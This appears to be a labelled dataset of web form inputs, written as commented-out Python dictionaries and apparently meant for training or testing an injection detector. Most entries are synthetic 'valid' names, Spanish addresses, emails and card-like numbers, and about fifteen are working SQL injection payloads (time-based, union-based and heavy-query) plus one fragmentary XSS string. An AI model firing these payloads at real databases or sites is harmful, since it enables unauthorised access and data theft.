#  {'pattern': '15423399j', 'type': 'valid'},
#  {'pattern': '46844', 'type': 'valid'},
#  {'pattern': 'gourley', 'type': 'valid'},
#  {'pattern': 'consalve', 'type': 'valid'},
#  {'pattern': 'c406l2n5', 'type': 'valid'},
#  {'pattern': 'kunneke@storagecraft.nz', 'type': 'valid'},
#  {'pattern': '89740217j', 'type': 'valid'},
#  {'pattern': 'igzquiza', 'type': 'valid'},
#  {'pattern': '17867', 'type': 'valid'},
#  {'pattern': 'zandra', 'type': 'valid'},
#  {'pattern': 'agenor', 'type': 'valid'},
#  {'pattern': 'chamberlain@muevemiweb.al', 'type': 'valid'},
#  {'pattern': 'calle jaime ferranz 51', 'type': 'valid'},
#  {'pattern': '12163', 'type': 'valid'},
#  {'pattern': "1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",
#   'type': 'sqli'},
#  {'pattern': '1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666',
#   'type': 'sqli'},
#  {'pattern': '1) where 7956=7956 or sleep(5)#', 'type': 'sqli'},
#  {'pattern': "-7387'))) order by 1--", 'type': 'sqli'},
#  {'pattern': '1))) union all select null,null,null#', 'type': 'sqli'},
#  {'pattern': '-5622" where 7970=7970 union all select 7970,7970,7970,7970,7970--',
#   'type': 'sqli'},
#  {'pattern': '-9860%" union all select 6996,6996,6996,6996,6996,6996#',
#   'type': 'sqli'},
#  {'pattern': '1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240',
#   'type': 'sqli'},
#  {'pattern': '1%"))) waitfor delay \'0:0:5\'--', 'type': 'sqli'},
#  {'pattern': '1") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#',
#   'type': 'sqli'},
#  {'pattern': '1%");select benchmark(5000000,md5(0x714e4153))#',
#   'type': 'sqli'},
#  {'pattern': "1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",
#   'type': 'sqli'},
#  {'pattern': "-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",
#   'type': 'sqli'},
#  {'pattern': "1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi",
#   'type': 'sqli'},
#  {'pattern': '-2583") where 3455=3455 or make_set(9354=9354,7185)--',
#   'type': 'sqli'},
#  {'pattern': '-6267"))) or 2724 in ((char(113) char(113) char(112) char(106) char(113) (select (case when (2724=2724) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and ((("rqws"="rqws',
#   'type': 'sqli'},
#  {'pattern': "1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",
#   'type': 'sqli'},
#  {'pattern': '8496429893525706', 'type': 'valid'},
#  {'pattern': 't324a3ra5a', 'type': 'valid'},
#  {'pattern': '4932', 'type': 'valid'},
#  {'pattern': 'di0cut6dor7', 'type': 'valid'},
#  {'pattern': 'jener monaj', 'type': 'valid'},
#  {'pattern': 'los polancos 133', 'type': 'valid'},
#  {'pattern': 'pintanos, los', 'type': 'valid'},
#  {'pattern': 'berrisfo', 'type': 'valid'},
#  {'pattern': 'zaguero', 'type': 'valid'},
#  {'pattern': '39202408n', 'type': 'valid'},
#  {'pattern': 'c/ montaer ruiz, 24, 12a', 'type': 'valid'},
#  {'pattern': '3609841962548925', 'type': 'valid'},
#  {'pattern': 'isador', 'type': 'valid'},
#  {'pattern': '4906', 'type': 'valid'},
#  {'pattern': 'marcanti', 'type': 'valid'},
#  {'pattern': 'jezabel', 'type': 'valid'},
#  {'pattern': 'pawluszek segu', 'type': 'valid'},
#  {'pattern': '05782219l', 'type': 'valid'},
#  {'pattern': 'c/ ricardo codoer, 112,', 'type': 'valid'},
#  {'pattern': 'brunhild', 'type': 'valid'},
#  {'pattern': 'te3496', 'type': 'valid'},
#  {'pattern': 'allaert@chicasdiabolo.ru', 'type': 'valid'},
#  {'pattern': '63974696n', 'type': 'valid'},
#  {'pattern': 'fla', 'type': 'valid'},
#  {'pattern': '50629', 'type': 'valid'},
#  {'pattern': 'demostrar', 'type': 'valid'},
#  {'pattern': '6212', 'type': 'valid'},
#  {'pattern': 'refriega', 'type': 'valid'},
#  {'pattern': 'isidoro', 'type': 'valid'},
#  {'pattern': '06918701w', 'type': 'valid'},
#  {'pattern': 'calle la caldera, 76 11-c', 'type': 'valid'},
#  {'pattern': '4898771590601702', 'type': 'valid'},
#  {'pattern': 'lap', 'type': 'valid'},
#  {'pattern': '42287106l', 'type': 'valid'},
#  {'pattern': 'calle beato tomas de zumarraga, 89 12-c', 'type': 'valid'},
#  {'pattern': 'olsen', 'type': 'valid'},
#  {'pattern': '5urgui8a', 'type': 'valid'},
#  {'pattern': 'spindler1', 'type': 'valid'},
#  {'pattern': 'trincha-32r1', 'type': 'valid'},
#  {'pattern': '08363269d', 'type': 'valid'},
#  {'pattern': 'alqueria de pixarroda, 27', 'type': 'valid'},
#  {'pattern': '0277189059505279', 'type': 'valid'},
#  {'pattern': 'dotan', 'type': 'valid'},
#  {'pattern': 'terribas', 'type': 'valid'},
#  {'pattern': 'leftwich@sms24h.sb', 'type': 'valid'},
#  {'pattern': '12232', 'type': 'valid'},
#  {'pattern': '5580428033394873', 'type': 'valid'},
#  {'pattern': 'comba', 'type': 'valid'},
#  {'pattern': '1140', 'type': 'valid'},
#  {'pattern': 'e23i6gulo', 'type': 'valid'},
#  {'pattern': 'nicolo', 'type': 'valid'},
#  {'pattern': 'floor@aebo.af', 'type': 'valid'},
#  {'pattern': '88341714w', 'type': 'valid'},
#  {'pattern': '29639', 'type': 'valid'},
#  {'pattern': '0052422482512057', 'type': 'valid'},
#  {'pattern': 'nanni-prucnal@fighting-machines.gf', 'type': 'valid'},
#  {'pattern': '08447437c', 'type': 'valid'},
#  {'pattern': '46510', 'type': 'valid'},
#  {'pattern': '0878247632477262', 'type': 'valid'},
#  {'pattern': '973', 'type': 'valid'},
#  {'pattern': 'merl', 'type': 'valid'},
#  {'pattern': 'quintn', 'type': 'valid'},
#  {'pattern': 'bricat', 'type': 'valid'},
#  {'pattern': '03046730n', 'type': 'valid'},
#  {'pattern': 'ronda sant antoni maria claret 144,', 'type': 'valid'},
#  {'pattern': 'jawad', 'type': 'valid'},
#  {'pattern': '92frico', 'type': 'valid'},
#  {'pattern': 'pipiolo sandrini', 'type': 'valid'},
#  {'pattern': 'velero@softwaresaas.ec', 'type': 'valid'},
#  {'pattern': 'c/ barriada nueva andalucia, 79, 5?f', 'type': 'valid'},
#  {'pattern': 'lora', 'type': 'valid'},
#  {'pattern': 'anja', 'type': 'valid'},
#  {'pattern': '3803', 'type': 'valid'},
#  {'pattern': 'descarada', 'type': 'valid'},
#  {'pattern': 'lian', 'type': 'valid'},
#  {'pattern': '85640413m', 'type': 'valid'},
#  {'pattern': 'c/ san juan bautista 66, 1?f', 'type': 'valid'},
#  {'pattern': '24410', 'type': 'valid'},
#  {'pattern': '1710045357867718', 'type': 'valid'},
#  {'pattern': 'de la barca pitti', 'type': 'valid'},
#  {'pattern': 'dierking3@carmensanmartin.kn', 'type': 'valid'},
#  {'pattern': 'diaz camacho 107, 2-a', 'type': 'valid'},
#  {'pattern': '9636562879352994', 'type': 'valid'},
#  {'pattern': 'trashumacin', 'type': 'valid'},
#  {'pattern': '389', 'type': 'valid'},
#  {'pattern': 'hatajo', 'type': 'valid'},
#  {'pattern': 'yasna', 'type': 'valid'},
#  {'pattern': 'hymen_israeli@aulahost.vc', 'type': 'valid'},
#  {'pattern': 'cami llorito, 38', 'type': 'valid'},
#  {'pattern': '5968115219030593', 'type': 'valid'},
#  {'pattern': 'bordin', 'type': 'valid'},
#  {'pattern': 'jeria cifr', 'type': 'valid'},
#  {'pattern': 'litchterman.steiner6@myalbum.by', 'type': 'valid'},
#  {'pattern': 'calle costa de llevant, 52', 'type': 'valid'},
#  {'pattern': 'murillo el cuende', 'type': 'valid'},
#  {'pattern': 'ligurs', 'type': 'valid'},
#  {'pattern': 'retos9a1o', 'type': 'valid'},
#  {'pattern': 'braham', 'type': 'valid'},
#  {'pattern': 'wieth@camiones-hibridos.md', 'type': 'valid'},
#  {'pattern': 'cami can rabella, s/n', 'type': 'valid'},
#  {'pattern': 'manzano, el', 'type': 'valid'},
#  {'pattern': 'virchick1', 'type': 'valid'},
#  {'pattern': 'superable', 'type': 'valid'},
#  {'pattern': 'duran manero', 'type': 'valid'},
#  {'pattern': 'paris-loisel@viavilano.cr', 'type': 'valid'},
#  {'pattern': 'burgos, s/n, 1f', 'type': 'valid'},
#  {'pattern': 'boimorto', 'type': 'valid'},
#  {'pattern': '1959107690181502', 'type': 'valid'},
#  {'pattern': 'cycelia', 'type': 'valid'},
#  {'pattern': '1166', 'type': 'valid'},
#  {'pattern': 'swope', 'type': 'valid'},
#  {'pattern': 'gutman@latiendadecolchones.mn', 'type': 'valid'},
#  {'pattern': '86626999y', 'type': 'valid'},
#  {'pattern': 'cubillas de santa marta', 'type': 'valid'},
#  {'pattern': '10182', 'type': 'valid'},
#  {'pattern': 'raha', 'type': 'valid'},
#  {'pattern': 'de5pi6ar4za4', 'type': 'valid'},
#  {'pattern': 'sagu cnstenla', 'type': 'valid'},
#  {'pattern': 'santaniello_tabernero@enfuerteventura.com.ni', 'type': 'valid'},
#  {'pattern': 'plaza asociacion de la prensa 107', 'type': 'valid'},
#  {'pattern': 'segura de los baos', 'type': 'valid'},
#  {'pattern': 'reid5', 'type': 'valid'},
#  {'pattern': 'chimenea', 'type': 'valid'},
#  {'pattern': 'jailyn', 'type': 'valid'},
#  {'pattern': 'irado', 'type': 'valid'},
#  {'pattern': 'norring-fujikawa@autoconstruccion.au', 'type': 'valid'},
#  {'pattern': 'plza. salamanca 39,', 'type': 'valid'},
#  {'pattern': '50780', 'type': 'valid'},
#  {'pattern': '2787973107257855', 'type': 'valid'},
#  {'pattern': 'd060u2ar', 'type': 'valid'},
#  {'pattern': 'hania', 'type': 'valid'},
#  {'pattern': 'hesseman.dolen@gaudio.mu', 'type': 'valid'},
#  {'pattern': 'calle vallseca 123', 'type': 'valid'},
#  {'pattern': '5176682769033876', 'type': 'valid'},
#  {'pattern': 'guillory', 'type': 'valid'},
#  {'pattern': '5155', 'type': 'valid'},
#  {'pattern': 'mcculloc', 'type': 'valid'},
#  {'pattern': 'iris', 'type': 'valid'},
#  {'pattern': 'duo_davalos@designworld.cz', 'type': 'valid'},
#  {'pattern': 'isla de cuba 85 3-b', 'type': 'valid'},
#  {'pattern': 'coripe', 'type': 'valid'},
#  {'pattern': 'zauhar', 'type': 'valid'},
#  {'pattern': 'semanera', 'type': 'valid'},
#  {'pattern': 'langellotti', 'type': 'valid'},
#  {'pattern': 'schaafsma@gay-tantra.sj', 'type': 'valid'},
#  {'pattern': 'villanueva del rebollar', 'type': 'valid'},
#  {'pattern': '38450', 'type': 'valid'},
#  {'pattern': 'grimsley', 'type': 'valid'},
#  {'pattern': 'luego', 'type': 'valid'},
#  {'pattern': 'trampeador', 'type': 'valid'},
#  {'pattern': 'kovac', 'type': 'valid'},
#  {'pattern': 'calle de can castellvi 35, 10-h', 'type': 'valid'},
#  {'pattern': 'vindel', 'type': 'valid'},
#  {'pattern': 'humfrid', 'type': 'valid'},
#  {'pattern': 'expendedora', 'type': 'valid'},
#  {'pattern': 'carvajal', 'type': 'valid'},
#  {'pattern': 'lightner.manor@rosaserigrafia.as', 'type': 'valid'},
#  {'pattern': 'castellnovo', 'type': 'valid'},
#  {'pattern': '19127', 'type': 'valid'},
#  {'pattern': 'ania', 'type': 'valid'},
#  {'pattern': 'esmilcea', 'type': 'valid'},
#  {'pattern': 'huerfanidad', 'type': 'valid'},
#  {'pattern': 'robertino', 'type': 'valid'},
#  {'pattern': '91220241x', 'type': 'valid'},
#  {'pattern': 'jose gomez gallito, 107,', 'type': 'valid'},
#  {'pattern': '32252', 'type': 'valid'},
#  {'pattern': '0577312599845778', 'type': 'valid'},
#  {'pattern': 'inoportunamente', 'type': 'valid'},
#  {'pattern': 'cibeles', 'type': 'valid'},
#  {'pattern': 'carminati@granbretana.com.uk', 'type': 'valid'},
#  {'pattern': '33273113w', 'type': 'valid'},
#  {'pattern': 'munbrega', 'type': 'valid'},
#  {'pattern': '4611888318080805', 'type': 'valid'},
#  {'pattern': 'adapuesto', 'type': 'valid'},
#  {'pattern': '3151', 'type': 'valid'},
#  {'pattern': '9o52cardea7', 'type': 'valid'},
#  {'pattern': 'benito@mayoriasilenciosa.mu', 'type': 'valid'},
#  {'pattern': 'calle juan de sevilla 102 3c', 'type': 'valid'},
#  {'pattern': 'cabanabona', 'type': 'valid'},
#  {'pattern': 'kouhi', 'type': 'valid'},
#  {'pattern': '4az', 'type': 'valid'},
#  {'pattern': '78267819s', 'type': 'valid'},
#  {'pattern': 'calle rendona 45, 5-a', 'type': 'valid'},
#  {'pattern': 'fady', 'type': 'valid'},
#  {'pattern': 'a8o8decer', 'type': 'valid'},
#  {'pattern': 'sonoe', 'type': 'valid'},
#  {'pattern': 'idalio', 'type': 'valid'},
#  {'pattern': 'portal tauler', 'type': 'valid'},
#  {'pattern': 'edlund@cementoscalibra.yu', 'type': 'valid'},
#  {'pattern': 'sant quirze de besora', 'type': 'valid'},
#  {'pattern': '27784', 'type': 'valid'},
#  {'pattern': 'meier', 'type': 'valid'},
#  {'pattern': 'c6nte9osa', 'type': 'valid'},
#  {'pattern': 'buisn andres', 'type': 'valid'},
#  {'pattern': 'oliveira_aptekman@engibraltar.va', 'type': 'valid'},
#  {'pattern': 'san bartolom de la torre', 'type': 'valid'},
#  {'pattern': '12510', 'type': 'valid'},
#  {'pattern': 'nadav6', 'type': 'valid'},
#  {'pattern': 'pent0et3o', 'type': 'valid'},
#  {'pattern': 'keer', 'type': 'valid'},
#  {'pattern': 'gala', 'type': 'valid'},
#  {'pattern': 'waggenheim@rubirubi.info', 'type': 'valid'},
#  {'pattern': '55265136t', 'type': 'valid'},
#  {'pattern': '45674', 'type': 'valid'},
#  {'pattern': '2996877022240469', 'type': 'valid'},
#  {'pattern': 'torrent de can caralleu 48, 12-g', 'type': 'valid'},
#  {'pattern': 'telde', 'type': 'valid'},
#  {'pattern': '7745667684469889', 'type': 'valid'},
#  {'pattern': 'brain', 'type': 'valid'},
#  {'pattern': '7242', 'type': 'valid'},
#  {'pattern': 'kalpak', 'type': 'valid'},
#  {'pattern': 'sixto', 'type': 'valid'},
#  {'pattern': 'peredo huecas', 'type': 'valid'},
#  {'pattern': '21468433a', 'type': 'valid'},
#  {'pattern': 'toril, 171 5h', 'type': 'valid'},
#  {'pattern': '5036144025003599', 'type': 'valid'},
#  {'pattern': 'edlene', 'type': 'valid'},
#  {'pattern': 'albiol', 'type': 'valid'},
#  {'pattern': 'blankenship@likeanangel.tc', 'type': 'valid'},
#  {'pattern': 'calle jose espejo, 130, 12?a', 'type': 'valid'},
#  {'pattern': '42148', 'type': 'valid'},
#  {'pattern': 'tom159', 'type': 'valid'},
#  {'pattern': '3046', 'type': 'valid'},
#  {'pattern': 'ru5runears2', 'type': 'valid'},
#  {'pattern': 'leobaldo', 'type': 'valid'},
#  {'pattern': '53087910t', 'type': 'valid'},
#  {'pattern': 'zafiro, s/n 4?b', 'type': 'valid'},
#  {'pattern': '50174', 'type': 'valid'},
#  {'pattern': 'wei-tsig8', 'type': 'valid'},
#  {'pattern': 'sabu@aridossanchez.lt', 'type': 'valid'},
#  {'pattern': 'avinguda pinyana, 7 2-h', 'type': 'valid'},
#  {'pattern': '06196', 'type': 'valid'},
#  {'pattern': '4780723426433072', 'type': 'valid'},
#  {'pattern': 'abellot*ada', 'type': 'valid'},
#  {'pattern': 'new', 'type': 'valid'},
#  {'pattern': 'donaldo', 'type': 'valid'},
#  {'pattern': 'castell sargatal', 'type': 'valid'},
#  {'pattern': '58222899d', 'type': 'valid'},
#  {'pattern': 'camino hoya mondongo, 124', 'type': 'valid'},
#  {'pattern': '01267', 'type': 'valid'},
#  {'pattern': '3892784649587009', 'type': 'valid'},
#  {'pattern': 'coxcojita', 'type': 'valid'},
#  {'pattern': 'quiliano', 'type': 'valid'},
#  {'pattern': 'pombal 114 3?d', 'type': 'valid'},
#  {'pattern': 'puerto de bjar', 'type': 'valid'},
#  {'pattern': 'ramesh', 'type': 'valid'},
#  {'pattern': 'cane5o', 'type': 'valid'},
#  {'pattern': 'haroun', 'type': 'valid'},
#  {'pattern': 'lluv8os4', 'type': 'valid'},
#  {'pattern': 'vano branchadell', 'type': 'valid'},
#  {'pattern': '02650843r', 'type': 'valid'},
#  {'pattern': 'pia de campos', 'type': 'valid'},
#  {'pattern': '3556606130011191', 'type': 'valid'},
#  {'pattern': 'en8relan3amien0o', 'type': 'valid'},
#  {'pattern': 'osteicoechea uslet', 'type': 'valid'},
#  {'pattern': '60537126e', 'type': 'valid'},
#  {'pattern': 'luis de gongora, 189', 'type': 'valid'},
#  {'pattern': 'mariana', 'type': 'valid'},
#  {'pattern': 'emblanquimiento', 'type': 'valid'},
#  {'pattern': 'sari7', 'type': 'valid'},
#  {'pattern': '4m4or6711a662', 'type': 'valid'},
#  {'pattern': 'sebastian_ferdi@tintaultravioleta.mv', 'type': 'valid'},
#  {'pattern': '95549133a', 'type': 'valid'},
#  {'pattern': 'baos de molgas', 'type': 'valid'},
#  {'pattern': '28760', 'type': 'valid'},
#  {'pattern': 'monte9a', 'type': 'valid'},
#  {'pattern': 'sibila', 'type': 'valid'},
#  {'pattern': 'neugebauer@buscamoto.gw', 'type': 'valid'},
#  {'pattern': '37246742j', 'type': 'valid'},
#  {'pattern': 'ciadoncha', 'type': 'valid'},
#  {'pattern': '17744', 'type': 'valid'},
#  {'pattern': 'tiefenth', 'type': 'valid'},
#  {'pattern': 'i77ovar', 'type': 'valid'},
#  {'pattern': 'rini', 'type': 'valid'},
#  {'pattern': 'inobediecia', 'type': 'valid'},
#  {'pattern': 'matienzo gallifa', 'type': 'valid'},
#  {'pattern': '69082096d', 'type': 'valid'},
#  {'pattern': 'estepa', 'type': 'valid'},
#  {'pattern': '40151', 'type': 'valid'},
#  {'pattern': '6r5int3805', 'type': 'valid'},
#  {'pattern': 'parmenia', 'type': 'valid'},
#  {'pattern': 'tarp@redstarz.asia', 'type': 'valid'},
#  {'pattern': 'don juan 126', 'type': 'valid'},
#  {'pattern': '17403', 'type': 'valid'},
#  {'pattern': '3786004753545909', 'type': 'valid'},
#  {'pattern': '1112', 'type': 'valid'},
#  {'pattern': 'brion6', 'type': 'valid'},
#  {'pattern': 'gavald', 'type': 'valid'},
#  {'pattern': 'selk@inversioneolica.ee', 'type': 'valid'},
#  {'pattern': 'c/ cal correu, 0,', 'type': 'valid'},
#  {'pattern': 'cbdar', 'type': 'valid'},
#  {'pattern': 'cal', 'type': 'valid'},
#  {'pattern': 'acrianzada', 'type': 'valid'},
#  {'pattern': 'victor juan', 'type': 'valid'},
#  {'pattern': 'ballasko@quehaces.mr', 'type': 'valid'},
#  {'pattern': 'calle sierra del quintanar, 199 9-b', 'type': 'valid'},
#  {'pattern': 'gaianes', 'type': 'valid'},
#  {'pattern': 'ex074ico', 'type': 'valid'},
#  {'pattern': '1230', 'type': 'valid'},
#  {'pattern': 'c0l0o4a', 'type': 'valid'},
#  {'pattern': 'bentez monill', 'type': 'valid'},
#  {'pattern': '50159319e', 'type': 'valid'},
#  {'pattern': 'antonio toledano, 78, 10?h', 'type': 'valid'},
#  {'pattern': '49167', 'type': 'valid'},
#  {'pattern': 'uriah', 'type': 'valid'},
#  {'pattern': 'maestre camprubi', 'type': 'valid'},
#  {'pattern': 'eckstine@blueeyes.eu', 'type': 'valid'},
#  {'pattern': 'guadalajara, 101 4-e', 'type': 'valid'},
#  {'pattern': 'venialbo', 'type': 'valid'},
#  {'pattern': '6913071576619939', 'type': 'valid'},
#  {'pattern': 'beland', 'type': 'valid'},
#  {'pattern': '7192', 'type': 'valid'},
#  {'pattern': 'ryszard', 'type': 'valid'},
#  {'pattern': 'alarico', 'type': 'valid'},
#  {'pattern': 'nrez muriscot', 'type': 'valid'},
#  {'pattern': 'logroo, 98, 5-d', 'type': 'valid'},
#  {'pattern': 'sant lloren savall', 'type': 'valid'},
#  {'pattern': '9589985001483437', 'type': 'valid'},
#  {'pattern': 'harty', 'type': 'valid'},
#  {'pattern': 'llobet', 'type': 'valid'},
#  {'pattern': 'confirm(2)>/', 'type': 'xss'},
#  {'pattern': 'brace4@velazquezlarraaga.kz', 'type': 'valid'},
#  {'pattern': 'alcalde lopez rancao, 194, 3-e', 'type': 'valid'},
#  {'pattern': 'vilafams', 'type': 'valid'},
#  {'pattern': '1499600534131254', 'type': 'valid'},
#  {'pattern': 'mundy', 'type': 'valid'},
#  {'pattern': '5642', 'type': 'valid'},
#  {'pattern': 'chan quete', 'type': 'valid'},
#  {'pattern': 'zuiga urbina', 'type': 'valid'},
#  {'pattern': 'grandinetti@mariposasentudia.mm', 'type': 'valid'},
#  {'pattern': 'cruz de caravaca, 177', 'type': 'valid'},
#  {'pattern': 'daimiel', 'type': 'valid'},
#  {'pattern': '4159457629727955', 'type': 'valid'},
#  {'pattern': 'valcourt', 'type': 'valid'},
#  {'pattern': 'dels', 'type': 'valid'},
#  {'pattern': 'brau ganfornina', 'type': 'valid'},
#  {'pattern': '64721683m', 'type': 'valid'},
#  {'pattern': 'c/ francisco grande cobian 90 4-e', 'type': 'valid'},
#  {'pattern': '41570', 'type': 'valid'},
#  {'pattern': '5068023807822442', 'type': 'valid'},
#  {'pattern': 'in85ecuacin', 'type': 'valid'},
#  {'pattern': '1304', 'type': 'valid'},
#  {'pattern': 'irresolucin', 'type': 'valid'},
#  {'pattern': 'nemesio', 'type': 'valid'},
#  {'pattern': 'veronese@prestigecars.tv', 'type': 'valid'},
#  {'pattern': '99020664y', 'type': 'valid'},
#  {'pattern': 'torrecilla del monte', 'type': 'valid'},
#  {'pattern': '29620', 'type': 'valid'},
#  {'pattern': 'or5i6or6i686', 'type': 'valid'},
#  {'pattern': 'llull valls', 'type': 'valid'},
#  {'pattern': 'calle oxigeno 197', 'type': 'valid'},
#  {'pattern': 'costur', 'type': 'valid'},
#  {'pattern': '7482251600785207', 'type': 'valid'},
#  {'pattern': 'witney', 'type': 'valid'},
#  {'pattern': '546', 'type': 'valid'},
#  {'pattern': 'kipnis', 'type': 'valid'},
#  {'pattern': 'aitor', 'type': 'valid'},
#  {'pattern': 'scanlon@theroxyblue.ng', 'type': 'valid'},
#  {'pattern': 'alcalde gregorio espino 165', 'type': 'valid'},
#  {'pattern': 'pozanco', 'type': 'valid'},
#  {'pattern': '3596949565075836', 'type': 'valid'},
#  {'pattern': 'dud', 'type': 'valid'},
#  {'pattern': 'henriquez femenias', 'type': 'valid'},
#  {'pattern': 'seymour@evelin.gn', 'type': 'valid'},
#  {'pattern': 'c/ fray diego de cadiz, 50', 'type': 'valid'},
#  {'pattern': 'mombuey', 'type': 'valid'},
#  {'pattern': 'kiyohara', 'type': 'valid'},
#  {'pattern': '47761an0i59r', 'type': 'valid'},
#  {'pattern': 'downs', 'type': 'valid'},
#  {'pattern': 'tapinga', 'type': 'valid'},
#  {'pattern': 'sunyer lleix', 'type': 'valid'},
#  {'pattern': 'abadia@comercioenlacalle.er', 'type': 'valid'},
#  {'pattern': 'c/ carranque, 113 5?a', 'type': 'valid'},
#  {'pattern': '45240', 'type': 'valid'},
#  {'pattern': 'kobeski', 'type': 'valid'},
#  {'pattern': 'prueba', 'type': 'valid'},
#  {'pattern': 'goyenaga', 'type': 'valid'},
#  {'pattern': 'lenya@fbi-criminal-network.com.mil', 'type': 'valid'},
#  {'pattern': 'cantaracillo', 'type': 'valid'},
#  {'pattern': '40190', 'type': 'valid'},
#  {'pattern': 'sosa', 'type': 'valid'},
#  {'pattern': 'fraccionario', 'type': 'valid'},
#  {'pattern': 'trung', 'type': 'valid'},
#  {'pattern': 'fragmentar', 'type': 'valid'},
#  {'pattern': 'ricci@redhost.is', 'type': 'valid'},
#  {'pattern': '89821319v', 'type': 'valid'},
#  {'pattern': 'palacios del arzobispo', 'type': 'valid'},
#  {'pattern': '8322438262219801', 'type': 'valid'},
#  {'pattern': 'reele.cto', 'type': 'valid'},
#  {'pattern': 'roussel@santacruzdelvoto.ws', 'type': 'valid'},
#  {'pattern': 'calle bernat de santa eugenia 90', 'type': 'valid'},
#  {'pattern': 'sariego', 'type': 'valid'},
#  {'pattern': 'onofredo', 'type': 'valid'},
#  {'pattern': 'domeable', 'type': 'valid'},
#  {'pattern': 'babar4', 'type': 'valid'},
#  {'pattern': 'cornisamen!to', 'type': 'valid'},
#  {'pattern': '17652259n', 'type': 'valid'},
#  {'pattern': 'calle segismundo moret 93 1?a', 'type': 'valid'},
#  {'pattern': '0614375180233873', 'type': 'valid'},
#  {'pattern': 'racette', 'type': 'valid'},
#  {'pattern': 'puy', 'type': 'valid'},
#  {'pattern': 'borgeaud@enmenorca.com.om', 'type': 'valid'},
#  {'pattern': 'jabeque, 86,', 'type': 'valid'},
#  {'pattern': 'relleu', 'type': 'valid'},
#  {'pattern': 'espavorida', 'type': 'valid'},
#  {'pattern': '9564', 'type': 'valid'},
#  {'pattern': 'bez clua', 'type': 'valid'},
#  {'pattern': 'gretler-rinell@magadan.com.yu', 'type': 'valid'},
#  {'pattern': 'lugar grela 152 1?f', 'type': 'valid'},
#  {'pattern': '19185', 'type': 'valid'},
#  {'pattern': 'soportador', 'type': 'valid'},
#  {'pattern': 'trilles aedo', 'type': 'valid'},
#  {'pattern': '79365532f', 'type': 'valid'},
#  {'pattern': 'calle siete cerros 144', 'type': 'valid'},
#  {'pattern': 'pankiw', 'type': 'valid'},
#  {'pattern': 'f8rol5ra', 'type': 'valid'},
#  {'pattern': '9a7bl1', 'type': 'valid'},
#  {'pattern': 'paucides', 'type': 'valid'},
#  {'pattern': 'selj@ebaz.travel', 'type': 'valid'},
#  {'pattern': 'plza. maimonides 197', 'type': 'valid'},
#  {'pattern': '15873', 'type': 'valid'},
#  {'pattern': '1204533777404121', 'type': 'valid'},
#  {'pattern': 'grandlocua', 'type': 'valid'},
#  {'pattern': 'talavera panfili', 'type': 'valid'},
#  {'pattern': '79140741h', 'type': 'valid'},
#  {'pattern': 'tierra 17', 'type': 'valid'},
#  {'pattern': '34305', 'type': 'valid'},
#  {'pattern': '9307824408281680', 'type': 'valid'},
#  {'pattern': '5469', 'type': 'valid'},
#  {'pattern': 'clarabel', 'type': 'valid'},
#  {'pattern': 'redmond-delcampe@biosaludsystems.do', 'type': 'valid'},
#  {'pattern': 'calle corinto 108', 'type': 'valid'},
#  {'pattern': 'ordinar', 'type': 'valid'},
#  {'pattern': 'edel', 'type': 'valid'},
#  {'pattern': 'costello_browallius@autoconstruccion.bt', 'type': 'valid'},
#  {'pattern': '07375030b', 'type': 'valid'},
#  {'pattern': 'puebla de obando', 'type': 'valid'},
#  {'pattern': 'parman', 'type': 'valid'},
#  {'pattern': '108', 'type': 'valid'},
#  {'pattern': 'ja3aln', 'type': 'valid'},
#  {'pattern': 'crisp vivo', 'type': 'valid'},
#  {'pattern': 'chopel@restauranteslaespadaa.bg', 'type': 'valid'},
#  {'pattern': 'ysero', 'type': 'valid'},
#  {'pattern': '10380', 'type': 'valid'},
#  {'pattern': 'lukers', 'type': 'valid'},
#  {'pattern': 'ofere*nte', 'type': 'valid'},
#  {'pattern': 'faix', 'type': 'valid'},
#  {'pattern': 'bartowna@professionalhost.do', 'type': 'valid'},
#  {'pattern': 'calle gola de perellonet, 196,', 'type': 'valid'},
#  {'pattern': 'albuixech', 'type': 'valid'},
#  {'pattern': 'ch9let_a', 'type': 'valid'},
#  {'pattern': '1084', 'type': 'valid'},
#  {'pattern': 'e3c7i3tu3a', 'type': 'valid'},
#  {'pattern': 'alceo', 'type': 'valid'},
#  {'pattern': 'amsterdam@mailboxrussia.nz', 'type': 'valid'},
#  {'pattern': '33371147x', 'type': 'valid'},
#  {'pattern': '50004', 'type': 'valid'},
#  {'pattern': '6187378791844475', 'type': 'valid'},
#  {'pattern': 'comiso', 'type': 'valid'},
#  {'pattern': 'barker ropero', 'type': 'valid'},
#  {'pattern': '02877417w', 'type': 'valid'},
#  {'pattern': 'calle villalon 13 1g', 'type': 'valid'},
#  {'pattern': '0911357592887177', 'type': 'valid'},
#  {'pattern': 'oucharek', 'type': 'valid'},
#  {'pattern': '6721', 'type': 'valid'},
#  {'pattern': 'marcum3', 'type': 'valid'},
#  {'pattern': 'leda', 'type': 'valid'},
#  {'pattern': 'pifarre marola', 'type': 'valid'},
#  {'pattern': '57401003h', 'type': 'valid'},
#  {'pattern': 'juan xxii 24, 3?c', 'type': 'valid'},
#  {'pattern': '46838', 'type': 'valid'},
#  {'pattern': '7496121103658289', 'type': 'valid'},
#  {'pattern': '9mbaicin', 'type': 'valid'},
#  {'pattern': 'jovn', 'type': 'valid'},
#  {'pattern': 'seddon@7peines.es', 'type': 'valid'},
#  {'pattern': '68035116n', 'type': 'valid'},
#  {'pattern': 'tors', 'type': 'valid'},
#  {'pattern': '6239536280691962', 'type': 'valid'},
#  {'pattern': 'a9tr8pfag4', 'type': 'valid'},
#  {'pattern': '6501', 'type': 'valid'},
#  {'pattern': '9a470ul0', 'type': 'valid'},
#  {'pattern': 'gaudencio', 'type': 'valid'},
#  {'pattern': 'clunes7@palodegolf.com.coop', 'type': 'valid'},
#  {'pattern': '25559456q', 'type': 'valid'},
#  {'pattern': 'villamuriel de cerrato', 'type': 'valid'},
#  {'pattern': '5212720427288459', 'type': 'valid'},
#  {'pattern': '4s2cu8e44', 'type': 'valid'},
#  {'pattern': 'parque san adrian, 196, 5h', 'type': 'valid'},
